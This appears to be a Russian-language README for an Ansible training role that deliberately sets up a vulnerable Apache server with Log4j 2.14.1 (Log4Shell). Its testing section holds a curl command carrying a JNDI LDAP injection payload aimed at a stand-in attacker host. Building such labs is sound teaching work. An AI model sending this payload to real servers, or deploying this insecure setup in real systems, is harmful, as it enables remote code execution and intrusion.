# README для Ansible роли web-server-apache

Роль для настройки веб-сервера Apache с уязвимостью Log4Shell (CVE-2021-44228).

## Требования

- Ubuntu 20.04 или совместимая система
- Root или sudo доступ
- Доступ в интернет для загрузки зависимостей

## Использование

```yaml
- hosts: web-servers
  roles:
    - role: web-server-apache
```

## Переменные

Нет дополнительных переменных. Все настройки жестко заданы для учебного сценария.

## Результат

После применения роли будет настроен:
- Apache 2.4.29 с небезопасной конфигурацией
- Java приложение с Log4j 2.14.1 (уязвимая версия)
- Открытые порты 80, 443, 8080
- Информационный файл об уязвимости

## Тестирование

```bash
# Проверка веб-сервера
curl http://<server-ip>:8080

# Тестирование Log4Shell
curl -H "User-Agent: \${jndi:ldap://<attacker-ip>:1389/Exploit}" http://<server-ip>:8080/
```
